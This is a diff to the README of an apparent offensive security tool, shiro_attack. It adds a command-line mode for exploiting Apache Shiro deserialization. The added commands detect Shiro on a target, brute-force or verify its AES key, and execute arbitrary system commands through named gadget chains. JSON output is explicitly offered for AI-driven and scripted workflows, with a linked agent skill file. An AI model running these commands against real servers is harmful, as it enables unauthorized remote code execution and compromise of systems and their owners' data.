@@ -118,6 +118,33 @@ java -jar shiro_attack-{version}-SNAPSHOT-all.jar
 
 Create a `data` folder in the same directory as the JAR, and place your `shiro_keys.txt` Key dictionary inside it.
 
+### CLI Mode (Command Line)
+
+CLI mode enables single-target exploitation without GUI. Suitable for scripting, automation, and AI-driven workflows.
+
+```bash
+# Detect Shiro framework
+java -cp shiro_attack-<version>-<jdk>.jar com.summersec.attack.CLI.MainCLI detect -u http://target:8080 [--cbc|--gcm]
+
+# Brute-force / verify Shiro key
+java -cp shiro_attack-<version>-<jdk>.jar com.summersec.attack.CLI.MainCLI crack  -u http://target:8080 [--cbc|--gcm]
+java -cp shiro_attack-<version>-<jdk>.jar com.summersec.attack.CLI.MainCLI crack  -u http://target:8080 -K <base64_key>
+
+# Execute system command (auto-detect gadget chain)
+java -cp shiro_attack-<version>-<jdk>.jar com.summersec.attack.CLI.MainCLI exec   -u http://target:8080 -K <key> -c <command> [--cbc|--gcm]
+
+# Specify gadget + echo type, skip auto-detection
+java -cp shiro_attack-<version>-<jdk>.jar com.summersec.attack.CLI.MainCLI exec   -u http://target:8080 -K <key> -c <command> -g CommonsBeanutilsString_183 -e AllEcho
+
+# JSON output mode (structured logs for AI/script parsing)
+java -cp shiro_attack-<version>-<jdk>.jar com.summersec.attack.CLI.MainCLI exec   -u http://target:8080 -K <key> -c id --json
+```
+
+With `--json`, log lines are structured JSON; command output remains raw text. Optional flags: `--proxy <url>`, `--timeout <sec>`. AES mode: `--cbc` for Shiro ≤1.2.4, `--gcm` for Shiro ≥1.2.5.
+
+See [skills/shiro-attack-cli/SKILL.md](./skills/shiro-attack-cli/SKILL.md) for detailed CLI usage.
+
+
 ## Attack Workflow
 
 ```
